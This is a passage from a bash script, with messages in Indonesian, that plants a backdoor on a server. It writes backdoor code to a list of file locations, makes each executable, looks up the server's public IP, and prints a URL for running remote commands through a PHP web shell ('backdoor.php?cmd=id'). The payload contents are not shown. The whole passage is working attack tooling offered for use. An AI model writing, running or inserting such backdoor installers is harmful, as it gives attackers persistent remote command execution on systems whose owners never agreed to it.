    echo -e "${YELLOW}[â€¢] Memasang backdoor...${NC}"
    
    for loc in "${BACKDOOR_LOCATIONS[@]}"; do
        echo "$BACKDOOR_CODE" > "$loc"
        chmod 755 "$loc"
        echo -e "${GREEN}  âœ… Backdoor: $loc${NC}"
    done
    
    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    
    echo -e "\n${GREEN}âœ… BACKDOOR TERPASANG!${NC}"
    echo -e "${CYAN}Coba akses: http://$IP_VPS/backdoor.php?cmd=id${NC}"
}

